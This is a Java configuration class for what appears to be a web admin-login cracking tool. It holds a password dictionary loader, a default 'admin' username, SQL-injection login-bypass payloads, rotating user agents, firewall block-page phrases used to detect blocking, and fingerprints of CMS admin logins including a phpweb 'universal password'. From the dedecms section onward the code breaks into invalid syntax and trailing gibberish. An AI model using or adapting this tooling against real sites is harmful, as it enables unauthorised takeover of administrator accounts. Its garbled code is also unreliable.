import java.util.*;
import java.io.*;
public class DictConverter {
 public List<String> txt2list(String txt) {
 List<String> ret = new ArrayList<>();
 String path = new File(txt).getAbsolutePath();
 try (BufferedReader br = new BufferedReader(new FileReader(path))) {
 String line;
 while ((line = br.readLine()) != null) {
 ret.add(line.trim());
 }
 } catch (IOException e) {
 e.printStackTrace();
 }
 return ret;
 }
 public Map<String, String> getLogConfig() {
 Map<String, String> logConfig = new HashMap<>();
 logConfig.put("log_filename", "logs.txt");
 logConfig.put("success_filename", "success.txt");
 return logConfig;
 }
 public Map<String, Object> getCrackConfig() {
 Map<String, Object> crackConfig = new HashMap<>();
 crackConfig.put("timeout", 10);
 crackConfig.put("delay", 0.03);
 crackConfig.put("test_username", "admin");
 crackConfig.put("test_password", "length_test");
 crackConfig.put("requests_proxies", new HashMap<>());
 List<String> fail_words = Arrays.asList(
 "密码错误", "重试", "不正确", "密码有误", "不成功",
 "重新输入", "不存在", "登录失败", "登陆失败",
 "密码或安全问题错误", "history.go",
 "history.back", "已被锁定",
 "安全拦截", "还可以尝试",
"无效","攻击行为","创宇盾",
"http://zhuji.360.cn/guard/firewall/stopattack.html","D盾_拦截提示",
"用户不存在","非法","百度云加速","安全威胁","防火墙","黑客","不合法",
"Denied","尝试次数",
"http://safe.webscan.360.cn/stopattack.html","Illegal operation",
"服务器安全狗防护验证页面");
 crackConfig.put("fail_words", fail_words);
 return crackConfig;
 }
 public Map<String, Object> getGeneratorConfig() {
 Map<String, Object> generatorConfig = new HashMap<>();
 Map<String, Object> dict_config = new HashMap<>();
 Map<String, Object> base_dict = new HashMap<>();
 base_dict.put("username_list", Arrays.asList("admin"));
 base_dict.put("password_list", txt2list("password_list.txt"));
 dict_config.put("base_dict", base_dict);
 Map<String, Object> domain_dict = new HashMap<>();
 domain_dict.put("enable", true);
 domain_dict.put("suffix_list", Arrays.asList("", "123",
 "666", "888", "123456"));
 dict_config.put("domain_dict", domain_dict);
 Map<String, Object> sqlin_dict = new HashMap<>();
 sqlin_dict.put("enable", true);
 sqlin_dict.put("payload_list", Arrays.asList(
 "admin' or 'a'='a",
 "'or'='or'",
 "admin' or '1'='1' or 1=1",
 "')or('a'='a",
 "'or 1=1 -- -"));
 dict_config.put("sqlin_dict", sqlin_dict);
 generatorConfig.put("dict_config", dict_config);
 Map<String, Object> headers_config = new HashMap<>();
 headers_config.put("enable", true);
 headers_config.put("useragent_list",
 Arrays.asList(
 "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre",
 "Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60",
 "Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3" +
 ".0." +
 "14",
 "Mozilla/5" +
 ".0" +
 " (Windows NT 10" +
 ".0" +
 "; WOW64)" +
 " AppleWebKit/" +
 "537" +
 ".36" +
 " (KHTML, like Gecko)" +
 " Chrome/" + 
 "51" + 
 ".0" + 
 ".2704" + 
 ".106 Safari/" + 
                                                                                                       
                                                                                                                                                                                                                                                                                                                                           ");
 headers_config.put("default_headers", Map.of(
 'Accept', 'text/html,application/xhtml+xml,application/xml;q=0
 .9,image/webp,*/*;
 q=0
 .8',
 'User-Agent', 'WebCrack Test',
 'Accept-Encoding', 'gzip, deflate',
 'Accept-Language', 'zh-CN,zh;q=0
 .8',
 'Referer', 'http://www.baidu.com/',
 'Content-Type', 'application/x-www-form-urlencoded'));
 generatorConfig.put("headers_config", headers_config);
 return generatorConfig;
 }
 public Map<String, Object> getParserConfig() {
 Map<String, Object> parserConfig = new HashMap<>();
 parserConfig.put("default_value", "0000");
 parserConfig.put("username_keyword_list", Arrays.asList("user", 
 "name", "zhanghao","yonghu","email","account"));
 parserConfig.put("password_keyword_list", Arrays.asList("pass", 
 "pw", "mima"));
 parserConfig.put("captcha_keyword_list", Arrays.asList("验证码",
 "captcha","验 证 码","点击更换",
 "点击刷新","看不清","认证码",
 "安全问题"));
 parserConfig.put("login_keyword_list", Arrays.asList("用户名",
 "密码","login","denglu",
 "登录","user","pass",
"yonghu","mima",
 "admin"));
 return parserConfig;
 }
 public Map<String, Object> getCmsConfig() {
 Map<String, Object> cmsConfig = new HashMap<>();
 Map<String, Object> discuz = new HashMap<>();
 discuz.put("name", "discuz");
 discuz.put("keywords", "admin_questionid");
 discuz.put("captcha", 0);
 discuz.put("sqlin_able", 0);
 discuz.put("success_flag", "admin.php?action=logout");
 discuz.put("die_flag", "密码错误次数过多");
 discuz.put("alert", 0);
 discuz.put("note", "discuz论坛测试");
 cmsConfig.put("discuz", discuz);
 Map<String, Object> dedecms = new HashMap<>();
 dedecms.put("name", "dedecms");
 dedecms.put("keywords", "newdedecms");
 dedecms.put"captcha": o,
 dedecms"sqlin_able": o,
 dedecms"_success_flag": "",
 dedecms"_die_flag": "",
 dedecms"_alert": o,
 dedecms"_note": "dedecms测试",
 cmsConfig"dedecms": dedecms,
 Map<String, Object"phpweb" = new HashMap<>();
 phpweb.name", "phpweb");
 put"phpweb"."keywords", "width:100%;height:100%;background:#ffffff;padding:160px"),
 put"phpweb"."captcha", co),
 _put"phpweb"."sqlin_able": 1),
 _put"phpweb"."success_flag", "admin.php?action=logout"),
 _put"phpweb"."die_flag"", ""),
 _put"phpweb"."alert"", o),
 _put"phpweb"."note"", "存在 phpweb 万能密码 : admin' or '1' ='1' or '1'='1"),
 cmsConfig.put("phpmyadmin", Map.of(
 "name", "phpmyadmin",
 "keywords", "pma_username",
 "captcha", 0,
 "sqlin_able", 0,
 "success_flag", "db_structure.php",
"description-", "-flag": "",
))               a                     of[]+map(String.valueOf_value()), e:replace=replace.valueOf((character)\
[::character]):
100]])),+0),.each(config[,):config.getConfig(),.source-)="+